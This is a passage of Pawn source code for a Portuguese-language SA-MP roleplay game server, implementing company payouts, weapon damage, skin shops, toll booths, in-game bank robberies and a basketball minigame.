		format(gstring, 128, " Sua produção atual é %d produções, e o total de entregas já feita pelas empresa é de %d.", atual_produ, total_produ);
		SendClientMessage(playerid, COR_BRANCO, gstring);
		format(gstring, 128, " Você recebe {00B900}R$%d {FFFFFF}pelas suas entregas atuais.", give_lucro);
		SendClientMessage(playerid, COR_BRANCO, gstring);
		SendClientMessage(playerid, COR_AMARELO, " Sua produção agora está em 0, para lucrar mais volte a trabalhar.");
		sGivePlayerCash(playerid, give_lucro);
	}
	else if(!strcmp(EmpresaInfo[m][Funcionario3], PlayerName(playerid), true))
	{
		new
			give_lucro = WE_GetInt(f(playerid), "qtdlucro"),
			atual_produ = WE_GetInt(f(playerid), "atualprod"),
			total_produ = WE_GetInt(gStr, "Producao3")
		;

		GameTextForPlayer(playerid, "~w~+ ~g~lucro empresa!", 2000, 1);
		format(gstring, 128, " %s o(a) proprietário(a) %s retirou o lucro da empresa %s ID %d que você trabalha.", EmpresaInfo[m][Funcionario3], EmpresaInfo[m][Proprietario], EmpresaInfo[m][NomeEmp], m);
		SendClientMessage(playerid, COR_AMARELO, gstring);
		format(gstring, 128, " Sua produção atual é %d produções, e o total de entregas já feita pelas empresa é de %d.", atual_produ, total_produ);
		SendClientMessage(playerid, COR_BRANCO, gstring);
		format(gstring, 128, " Você recebe {00B900}R$%d {FFFFFF}pelas suas entregas atuais.", give_lucro);
		SendClientMessage(playerid, COR_BRANCO, gstring);
		SendClientMessage(playerid, COR_AMARELO, " Sua produção agora está em 0, para lucrar mais volte a trabalhar.");
		sGivePlayerCash(playerid, give_lucro);
	}
	WE_SetInt(f(playerid), "atualprod", 0);
	WE_SetInt(f(playerid), "msglucro", 0);
	WE_SetInt(f(playerid), "qtdlucro", 0);
}

stock formatSeconds(seconds, &hours_left, &minutes_left, &seconds_left)
{
    hours_left = seconds/60/60;
    minutes_left = (seconds - hours_left*60*60)/60;
    seconds_left = (seconds - hours_left*60*60 - minutes_left*60);
    return 1;
}

forward rHoraMinuto(InputSec, OutputString[], OutputStringLen);
public rHoraMinuto(InputSec, OutputString[], OutputStringLen)
{
    new
      Days,
      Hours,
      Mins,
      Secs;

    Days = floatround((InputSec / 86400), floatround_floor); // get Days
    Secs = (InputSec - (Days * 86400));// remove days from total seconds
    Hours = floatround((Secs / 3600), floatround_floor); // get Hours
    Secs = (Secs - (Hours * 3600)); // remove Hours from secs
    Mins = floatround((Secs / 60), floatround_floor);// get Mins
    Secs = (Secs - (Mins * 60));// remove Mins from secs, whats left is seconds

	if(Hours > 0)
	{
		format(OutputString, OutputStringLen, "%i hora e %i minutos.", Hours, Mins);
	}
	else
	{
		format(OutputString, OutputStringLen, "%i minutos.", Mins);
	}
    return 1;
}

public OnPlayerShootPlayerWE(Shooter,Target,Float:HealthLost,Float:ArmourLost)
{
    //#define SHOOTSYSTEM_DEBUG
    new Weapon = GetPlayerWeapon(Shooter),
        Float:Damage = 0; //Adicional. Ou Seja, isso mais o damage da própria arma

    if(Weapon == 22) Damage = 8.0; // Colt .45
    if(Weapon == 23) Damage = 5.0; // Silenced Colt .45
    if(Weapon == 24) Damage = 25.0; // Deagle/Glock
    if(Weapon == 25) Damage = 20.0; // Shotgun
    if(Weapon == 27) Damage = 20.0; // SPAZ
    if(Weapon == 28) Damage = 9.0; // UZI
    if(Weapon == 29) Damage = 17.0; // MP5
    if(Weapon == 30) Damage = 23.0; // AK
    if(Weapon == 31) Damage = 19.0; // M4
    if(Weapon == 32) Damage = 10.0; // Tec9
    if(Weapon == 33) Damage = 30.0; // Country Rifle
    if(Weapon == 34) Damage = 70.0; // Sniper
    if(Weapon == 4) Damage = 30.0; // Faca
    if(Weapon == 16) Damage = 300.0; // Granada

    new Float:tArmour, Float:tHealth;
    GetPlayerArmour(Target, tArmour);
    GetPlayerHealth(Target, tHealth);
    //--->
    new Float:newColete;
    newColete = tArmour - Damage;
    if(newColete >= 0) SetPlayerArmour(Target, newColete);
    else
    {
        SetPlayerArmour(Target, 0.0);
        //SetPlayerHealth(Target, newColete * (-1));
        SetPlayerHealth(Target,  tHealth + newColete);
    }
    return 1;
}

public OnPlayerModelSelection(playerid, response, listid, modelid)
{
	if(listid == skins_binco)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	if(listid == skins_didiersachs)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	if(listid == skins_prolaps)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	if(listid == skins_suburban)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	if(listid == skins_victim)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	if(listid == skins_zip)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	if(listid == skins_vip)
	{
	    if(response)
	    {
	    	SetPlayerSkin(playerid, modelid);
	    	format(gStr, sizeof(gStr), "Compra de skin  ID: %d  Nome de identificação: %s", modelid, GetSkinName(modelid));
			SendClientMessage(playerid, VERMELHO_WE, gStr);
			SendClientFormat(playerid, AZUL_WE, "A compra da skin ID: %d (%s) foi efetuada com sucesso!", modelid, GetSkinName(modelid));
			GameTextForPlayer(playerid, "~b~~h~COMPRA DE SKIN EFETUADA!", 3000, 1);
			SetPlayerSkin(playerid, (modelid));
			sGivePlayerCash(playerid, -500);
			WE_SetInt(gFile, "Skin", (modelid));
	    }
    	return 1;
	}
	return 1;
}

//godcar
public OnPlayerUpdateEx(playerid)
{
    if(IsPlayerInAnyVehicle(playerid))
    {
        if(godcar[playerid] == true)
        {
            RepairVehicle(GetPlayerVehicleID(playerid));
            SetVehicleHealth(GetPlayerVehicleID(playerid), 1000);
        }
    }
}
//Pedágio
forward CheckViaFacil();
public CheckViaFacil() {
	for(new i; i != GetMaxPlayers(); i++) {
		if(IsPlayerConnected(i)) {
		    if(IsPlayerInAnyVehicle(i)) {
		        if(IsPlayerInRangeOfPoint(i, 7.5, 56.05, -1528.62, 4.67) && PassouPedagio[i] == false && pInfo[i][AFK] == false) {
		            if(ViaFacil[i]) {
		                if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
		                	PassouPedagio[i] = true;
							SetTimerEx("PassouPedagioP", 3000, false, "i", i);
			                SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você possui o plano Via Fácil e não precisa parar! Boa Viagem.");
	                  		ViaFacil[i] --;
						}
                    	MovePlayerObject(i, CancelaP[i][0], 56.05, -1528.62, 4.67+0.0001, 0.0001, 0.0000, 0.0000, 262.0000);
					}
					if(!ViaFacil[i] && GetPlayerCash(i) >= 100) {
						if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
						    PassouPedagio[i] = true;
	  						SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você não possui o plano Via Fácil e precisa parar para pagar!");
	    					TogglePlayerControllable(i, false);
	                  		sGivePlayerCash(i, -100);
	                  		SetTimerEx("MoveCancela1", 3000, false, "i", i);
						}
					}
					else
					{
					    PassouPedagio[i] = true;
					    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
					    SendClientMessage(i,COR_ERRO,"Você não possui R$100 reais para o pedágio!");
					}
				} else if(IsPlayerInRangeOfPoint(i, 7.5, 56.05, -1535.82, 4.71) && PassouPedagio[i] == false && pInfo[i][AFK] == false) {
    				if(ViaFacil[i]) {
		            	if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
		            	    PassouPedagio[i] = true;
		            	    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
			                SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você possui o plano Via Fácil e não precisa parar! Boa Viagem.");
	                  		ViaFacil[i] --;
						}
                  		MovePlayerObject(i, CancelaP[i][1], 56.05, -1535.82, 4.71+0.0001, 0.0001, 0.0000, 0.0000, 262.0000);
					} else if(!ViaFacil[i] && GetPlayerCash(i) >= 100) {
						if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
						    PassouPedagio[i] = true;
	  						SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você não possui o plano Via Fácil e precisa parar para pagar!");
	    					TogglePlayerControllable(i, false);
	                  		sGivePlayerCash(i, -100);
	                  		SetTimerEx("MoveCancela2", 3000, false, "i", i);
						}
					}
					else
					{
	    				PassouPedagio[i] = true;
					    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
					    SendClientMessage(i,COR_ERRO,"Você não possui R$100 reais para o pedágio!");
					}
				}
		        if(IsPlayerInRangeOfPoint(i, 7.5, 1741.48804, 520.73932, 27.95000) && PassouPedagio[i] == false && pInfo[i][AFK] == false) {
		            if(ViaFacil[i]) {
		                if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
		                    PassouPedagio[i] = true;
		                    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
			                SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você possui o plano Via Fácil e não precisa parar! Boa Viagem.");
	                  		ViaFacil[i] --;
						}
                    	MovePlayerObject(i, CancelaP[i][2], 1741.48804, 520.73932, 27.95000+0.0001, 0.0001,  0.00000, 0.00000, -19.36600);
					}
					if(!ViaFacil[i] && GetPlayerCash(i) >= 100) {
						if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
						    PassouPedagio[i] = true;
	  						SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você não possui o plano Via Fácil e precisa parar para pagar!");
	    					TogglePlayerControllable(i, false);
	                  		sGivePlayerCash(i, -100);
	                  		SetTimerEx("MoveCancela3", 3000, false, "i", i);
						}
					}
					else
					{
						PassouPedagio[i] = true;
					    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
					    SendClientMessage(i,COR_ERRO,"Você não possui R$100 reais para o pedágio!");
					}
				} else if(IsPlayerInRangeOfPoint(i, 7.5, 1733.18848, 517.22089, 28.16000) && PassouPedagio[i] == false && pInfo[i][AFK] == false) {
		            if(ViaFacil[i]) {
		            	if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
		            	    PassouPedagio[i] = true;
		            	    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
			                SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você possui o plano Via Fácil e não precisa parar! Boa Viagem.");
	                  		ViaFacil[i] --;
						}
                  		MovePlayerObject(i, CancelaP[i][3], 1733.18848, 517.22089, 28.16000+0.0001, 0.0001,  0.00000, 0.00000, -199.51997);
					} else if(!ViaFacil[i] && GetPlayerCash(i) >= 100) {
						if(GetPlayerState(i) == PLAYER_STATE_DRIVER) {
						    PassouPedagio[i] = true;
	  						SendClientMessage(i, 0xFFFFFFFF, "Via Fácil: Você não possui o plano Via Fácil e precisa parar para pagar!");
	    					TogglePlayerControllable(i, false);
	                  		sGivePlayerCash(i, -100);
	                  		SetTimerEx("MoveCancela4", 3000, false, "i", i);
						}
					}
					else
					{
						PassouPedagio[i] = true;
					    SetTimerEx("PassouPedagioP", 3000, false, "i", i);
					    SendClientMessage(i,COR_ERRO,"Você não possui R$100 reais para o pedágio!");
					}
				}
		    }
		}
	}
	return 1;
}

/*forward AttDados(playerid);
public AttDados(playerid)
{
	SendClientMessage(playerid, AZUL_WE, "[Dados] Seus dados foram salvos automaticamente!");
	SalvarFile(playerid);
	return 1;
}*/

//AntiVehicle
forward OnPlayerChangeVehicle(playerid, vehicleid);
public OnPlayerChangeVehicle(playerid, vehicleid)
{
    #pragma unused vehicleid
    if((GetTickCount() - vehicleTime[playerid]) < 250)
    {
        Kick(playerid);
    }

    vehicleTime[playerid] = GetTickCount();
}//

stock NomePatente(playerid)
{
    new teext[30];
	if(pPatente[playerid] < 20) teext = "Recruta";
	else if(pPatente[playerid] >= 20 && pPatente[playerid] < 60) teext = "Sargento";
	else if(pPatente[playerid] >= 60 && pPatente[playerid] < 100) teext = "Subtenente";
	else if(pPatente[playerid] >= 100 && pPatente[playerid] < 170) teext = "Tenente";
	else if(pPatente[playerid] >= 170 && pPatente[playerid] < 270) teext = "Capitão";
	else if(pPatente[playerid] >= 270 && pPatente[playerid] < 390) teext = "Major";
	else if(pPatente[playerid] >= 390 && pPatente[playerid] < 500) teext = "Coronel";
	else if(pPatente[playerid] >= 500 && pPatente[playerid] < 800) teext = "Comandante";
	else if(pPatente[playerid] >= 800 && pPatente[playerid] < 1500) teext = "General";
	else if(pPatente[playerid] >= 1500) teext = "Marechal";
	return teext;
}

stock NomeTrampo(playerid)
{
    new teext[30];
	if(pCargo[playerid] < 20) teext = "Novato(a)";
	else if(pCargo[playerid] >= 20 && pCargo[playerid] < 50) teext = "Intermediário";
	else if(pCargo[playerid] >= 50) teext = "Experiênte";
	return teext;
}

stock NomeAssaltos(playerid)
{
    new teext[30];
	if(pAssalto[playerid] < 50) teext = "Novato(a)";
	else if(pAssalto[playerid] >= 50 && pAssalto[playerid] < 150) teext = "Intermediário";
	else if(pAssalto[playerid] >= 150 && pAssalto[playerid] < 300) teext = "Experiênte";
	else if(pAssalto[playerid] >= 300 && pAssalto[playerid] < 500) teext = "Veterano(a)";
	else if(pAssalto[playerid] >= 500) teext = "Profissional";
	return teext;
}

forward ConcluirAssalto(playerid);
public ConcluirAssalto(playerid)
{
	ClearAnimations(playerid);
   	new dGrana = random(10000), RobString[120];
	format(RobString, sizeof(RobString), "Você assaltou R$%d com sucesso, fuja!", dGrana);
	SendClientMessage(playerid, AZUL_WE, RobString);
	GameTextForPlayer(playerid, "~r~~h~FUJA!", 2000, 4);
	GivePlayerCash(playerid, dGrana);
	BolsaDinheiro[playerid] = SetPlayerAttachedObject(playerid, 3, 1550, 1, 0.024558, -0.279748, -0.060589, 6.105677, 137.291320, 147.132202, 1.019888, 1.000000, 1.000000);
	Roubando[playerid] = false;
	ComBolsa[playerid] = true;
	ProxRoubo[playerid] = SetTimerEx("ProxAssalto", 1500000, false, "i", playerid);
	SetTimerEx("RetirarBolsa", 30000, false, "i", playerid);
	pAssalto[playerid] += 1;
	KillTimer(AnimRoubo[playerid]);
	return 1;
}

forward ProxAssalto(playerid);
public ProxAssalto(playerid)
{
	SendClientMessage(playerid, AZUL_WE, "Você já pode realizar outro assalto!");
	Roubou[playerid] = false;
	PortaBanco[playerid] = false;
	return 1;
}

forward AnimAssalto(playerid);
public AnimAssalto(playerid)
{
    SetPlayerFacingAngle(playerid, 179.0151);
    ApplyAnimation(playerid,"ROB_BANK","CAT_Safe_Rob",1.0,1,0,0,0,0);
	return 1;
}

forward AnimBomba(playerid);
public AnimBomba(playerid)
{
    ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0,0,0,0,0, 0);
    SetTimerEx("FimAnimBomba",2500,false,"i",playerid);
    return 1;
}

forward FimAnimBomba(playerid);
public FimAnimBomba(playerid)
{
	KillTimer(PlantarBomba[playerid]);
	return 1;
}

forward BancoRoubado();
public BancoRoubado()
{
	bRoubado = false;
	return 1;
}

forward Abastecendo(playerid);
public Abastecendo(playerid)
{
	TogglePlayerControllable(playerid, true);
	SendClientMessage(playerid, AZUL_WE, "Veículo abastecido, volte sempre!");
	return 1;
}

forward VaultTempo();
public VaultTempo()
{
	MoveObject(Vault,1770.55737, -1694.13037, 13.94880, 1.0,  0.00000, 0.00000, -90.00000);
	CofreAberto = false;
	return 1;
}

forward VaultExplodir(playerid);
public VaultExplodir(playerid)
{
	MoveObject(Vault, 1768.80823, -1694.73547, 12.60880, 70.0,  90.00000, 0.00000, -74.87997);
	VaultBroken[0] = CreateObject(1550, 1768.76306, -1696.12256, 12.89180,   0.00000, 0.00000, 0.00000);
	VaultBroken[1] = CreateObject(1550, 1767.17139, -1695.46106, 12.89180,   0.00000, 90.00000, 180.00000);
	VaultBroken[2] = CreateObject(2003, 1769.23499, -1696.63489, 12.65180,   -90.00000, 0.00000, 239.33994);
	VaultBroken[3] = CreateObject(1829, 1768.11792, -1696.44629, 13.13180,   -90.00000, 0.00000, 90.00000);
	VaultBroken[4] = CreateObject(1550, 1767.87866, -1693.50085, 12.89180,   0.00000, 90.00000, 180.00000);
	CofreAberto = true;
	SendClientMessage(playerid, AZUL_WE, "O cofre foi arrombado com sucesso, continue o assalto!");
	SetTimer("VaultConcerto",1500000,false);
	return 1;
}

forward VaultConcerto();
public VaultConcerto()
{
	DestroyObject(VaultBroken[0]);
	DestroyObject(VaultBroken[1]);
	DestroyObject(VaultBroken[2]);
	DestroyObject(VaultBroken[3]);
    DestroyObject(VaultBroken[4]);
	MoveObject(Vault, 1770.55737, -1694.13037, 13.94880, 70.0,  0.00000, 0.00000, -90.00000);
	CofreAberto = false;
	return 1;
}

stock ProxDetector(Float:radi, playerid, string[], color)
{
	new Float:x,Float:y,Float:z;
	GetPlayerPos(playerid,x,y,z);
	foreach(Player,i)
	{
		if(IsPlayerInRangeOfPoint(i,radi,x,y,z))
		{
			SendClientMessage(i,color,string);
		}
	}
}

stock split(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc))
	{
		if(strsrc[i] == delimiter || i == strlen(strsrc))
		{
			len = strmid(strdest[aNum], strsrc, li, i, 128);
			strdest[aNum][len] = 0;
			li = i+1;
			aNum++;
		}
		i++;
	}
	return 1;
}

stock PlaySoundEx(soundid, Float:x, Float:y, Float:z, range)
{
	foreach(new i : Player)
	{
		if(!IsPlayerConnected(i)) continue;
		if(!IsPlayerInRangeOfPoint(i, range, x, y, z)) continue;
		PlayerPlaySound(i, soundid,0,0, 0);
	}
}

//Basquete
public OnObjectMoved(objectid)
{
	new i = Baller;
	if(ShootingBall == 2)
	{
		BallDown2(i);
		return 1;
	}
	else if(ShootingBall == 3)
	{
		BallDown3(i);
		return 1;
	}
	else if(ShootingBall == 4)
	{
		BallDown4(i);
		return 1;
	}
	else if(ShootingBall == 5)
	{
		BallDown5(i);
		return 1;
	}
	else if(ShootingBall == 6)
	{
		ApplyAnimation(i,"BSKTBALL","BBALL_walk",4.1,1,1,1,1,1);
		HavingBall[i] = 1;
		Anim[i] = 0;
	}
	if(BallBounce == 1)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z+1.2, 4);
		BallBounce = 2;
	}
	else if(BallBounce == 2)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z-1.2, 4);
		BallBounce = 3;
	}
	else if(BallBounce == 3)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z+0.8, 3);
		BallBounce = 4;
	}
	else if(BallBounce == 4)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z-0.8, 3);
		BallBounce = 5;
	}
	else if(BallBounce == 5)
	{

		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z+0.5, 2);
		BallBounce = 6;
	}
	else if(BallBounce == 6)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z-0.5, 2);
		BallBounce = 7;
	}
	else if(BallBounce == 7)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z+0.2, 1);
		BallBounce = 8;
	}
	else if(BallBounce == 8)
	{
		new Float:x, Float:y, Float:z;
		GetObjectPos(Ball, x, y, z);
		MoveObject(Ball, x, y, z-0.2, 1);
		BallBounce = 0;
	}
	if(!HavingBall[i]) return 1;
	new Keys, ud, lr;
	GetPlayerKeys(i, Keys, ud, lr);
	if(Anim[i])
	{
 		switch(BallStatus)
		{
		        case 0:
			{
				BallStatus = 1;
				new Float:x, Float:y, Float:z;
				GetPlayerPos(i, x, y, z);
				StopObject(Ball);
				new Float:x2, Float:y2;
				GetXYInFrontOfPlayer(i, x2, y2, 0.4);
				MoveObject(Ball, x2, y2, z+0.1, 5.5);
			}
			case 1:
			{
				BallStatus = 0;
				new Float:x, Float:y, Float:z;
				GetPlayerPos(i, x, y, z);
				StopObject(Ball);
				new Float:x2, Float:y2;
				GetXYInFrontOfPlayer(i, x2, y2, 0.4);
				MoveObject(Ball, x2, y2, z-0.8, 5.5);
			}
		}
		return 1;
	}
	if(Keys & KEY_SPRINT)
	{

		ApplyAnimation(i,"BSKTBALL","BBALL_run",4.1,1,1,1,1,1);
		switch(BallStatus)
		{
			case 0:
			{
				BallStatus = 1;
				new Float:x, Float:y, Float:z;
				GetPlayerPos(i, x, y, z);
				StopObject(Ball);
				new Float:x2, Float:y2;
				GetXYInFrontOfPlayer(i, x2, y2, 1.5);
				MoveObject(Ball, x2, y2, z+0.1, 8);
			}
			case 1:
			{
				BallStatus = 0;
				new Float:x, Float:y, Float:z;
				GetPlayerPos(i, x, y, z);
				StopObject(Ball);
				new Float:x2, Float:y2;
				GetXYInFrontOfPlayer(i, x2, y2, 1.5);
				MoveObject(Ball, x2, y2, z-0.8, 8);
			}
		}
		return 1;
	}
	else
	{
		ApplyAnimation(i,"BSKTBALL","BBALL_walk",4.1,1,1,1,1,1);
	}
	switch(BallStatus)
	{
		case 0:
		{
			BallStatus = 1;
			new Float:x, Float:y, Float:z;
			GetPlayerPos(i, x, y, z);
			StopObject(Ball);
			new Float:x2, Float:y2;
			GetXYInFrontOfPlayer(i, x2, y2, 1.2);
			MoveObject(Ball, x2, y2, z+0.1, 5);
		}
		case 1:
		{

			BallStatus = 0;
			new Float:x, Float:y, Float:z;
			GetPlayerPos(i, x, y, z);
			StopObject(Ball);
			new Float:x2, Float:y2;
			GetXYInFrontOfPlayer(i, x2, y2, 1.2);
			MoveObject(Ball, x2, y2, z-0.8, 5);
		}
	}
	return 1;
}//

//Basquete
stock IsPlayerFacingPoint(playerid, Float:dOffset, Float:pX, Float:pY, Float:pZ)
{
	#pragma unused pZ
	new
	Float:X,
	Float:Y,
	Float:Z,
	Float:pA,
	Float:ang;

	if(!IsPlayerConnected(playerid)) return 0;

	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, pA);

	if( Y > pY ) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	else if( Y < pY && X < pX ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
	else if( Y < pY ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);

	if(AngleInRangeOfAngle(-ang, pA, dOffset)) return true;

	return false;

}

stock IsPlayerFacingPlayer(playerid, targetid, Float:dOffset)
{
	new
	Float:pX,
	Float:pY,
	Float:pZ,
	Float:pA,
	Float:X,
	Float:Y,
	Float:Z,
	Float:ang;

	if(!IsPlayerConnected(playerid) || !IsPlayerConnected(targetid)) return 0;

	GetPlayerPos(targetid, pX, pY, pZ);
	GetPlayerPos(playerid, X, Y, Z);
	GetPlayerFacingAngle(playerid, pA);

	if( Y > pY ) ang = (-acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);
	else if( Y < pY && X < pX ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 450.0);
	else if( Y < pY ) ang = (acos((X - pX) / floatsqroot((X - pX)*(X - pX) + (Y - pY)*(Y - pY))) - 90.0);

	if(AngleInRangeOfAngle(-ang, pA, dOffset)) return true;

	return false;

}

stock AngleInRangeOfAngle(Float:a1, Float:a2, Float:range)
{
	a1 -= a2;
	if((a1 < range) && (a1 > -range)) return true;

	return false;

}

stock ShowTextDrawStatus(playerid)
{
	TextDrawShowForPlayer(playerid, Textdraw0S);
	TextDrawShowForPlayer(playerid, Textdraw1S);
	TextDrawShowForPlayer(playerid, Textdraw2);
	TextDrawShowForPlayer(playerid, Player_barEat[playerid]);
	TextDrawShowForPlayer(playerid, Textdraw4);
	TextDrawShowForPlayer(playerid, Textdraw5);
	TextDrawShowForPlayer(playerid, Textdraw6);
	TextDrawShowForPlayer(playerid, Player_barDrink[playerid]);
	TextDrawShowForPlayer(playerid, Textdraw8);
	TextDrawShowForPlayer(playerid, Textdraw9);
	TextDrawShowForPlayer(playerid, Textdraw10);
	TextDrawShowForPlayer(playerid, Textdraw11);
	TextDrawShowForPlayer(playerid, Player_barSleep[playerid]);
}

stock SetStatusBar(playerid, barid, Text:barID, Float:Percent)
{
    Player_Bars[barid][pl_v] = floatround(Percent);
	new Float:finalPercent;
	finalPercent = (90 * Percent) / 100;
	finalPercent = 603.0 - finalPercent;

	TextDrawTextSize(barID, finalPercent, -2.000000);
	TextDrawHideForPlayer(playerid, barID);
	TextDrawShowForPlayer(playerid, barID);
	return 1;
}

forward BallDown(playerid, Float:oldz);
public BallDown(playerid, Float:oldz)
{
	new Float:x, Float:y, Float:z;
	GetObjectPos(Ball, x, y, z);
	new Float:a;
	new Float:x2, Float:y2;
	GetPlayerPos(playerid, x2, y2, a);
	GetPlayerFacingAngle(playerid, a);
	x2 += (16 * floatsin(-a, degrees));
	y2 += (16 * floatcos(-a, degrees));
	MoveObject(Ball, x2, y2, oldz-0.8, 10.0+random(3));
	Baller = 999;
	ShootingBall = 0;
	BallBounce = 1;
	return 1;
}

forward BallDown2(playerid);
public BallDown2(playerid)
{
	MoveObject(Ball, 2795.5237,-2019.6152,13.5547-0.8, 10.0+random(3));
	Baller = 999;
	ShootingBall = 0;
	GameTextForPlayer(playerid, "Cesta!", 3000, 3);
	BallBounce = 1;
	return 1;
}

forward BallDown3(playerid);
public BallDown3(playerid)
{
	MoveObject(Ball, 2768.3669,-2019.6644,13.5547-0.8, 10.0+random(3));
	Baller = 999;
	ShootingBall = 0;
	GameTextForPlayer(playerid, "Cesta!", 3000, 3);
	BallBounce = 1;
	return 1;
}

forward BallDown4(playerid);
public BallDown4(playerid)
{
	MoveObject(Ball, 2795.5237+random(5),-2019.6152+random(5),13.5547-0.8, 10.0+random(3));
	Baller = 999;
	ShootingBall = 0;
	GameTextForPlayer(playerid, "Errou!", 3000, 3);
	BallBounce = 1;
	return 1;
}

forward BallDown5(playerid);
public BallDown5(playerid)
{
	MoveObject(Ball, 2768.3669+random(5),-2019.6644+random(5),13.5547-0.8, 10.0+random(3));
	Baller = 999;
	ShootingBall = 0;
	GameTextForPlayer(playerid, "Errou!", 3000, 3);
	BallBounce = 1;
	return 1;
}

forward ShootMiss(playerid);
public ShootMiss(playerid)
{
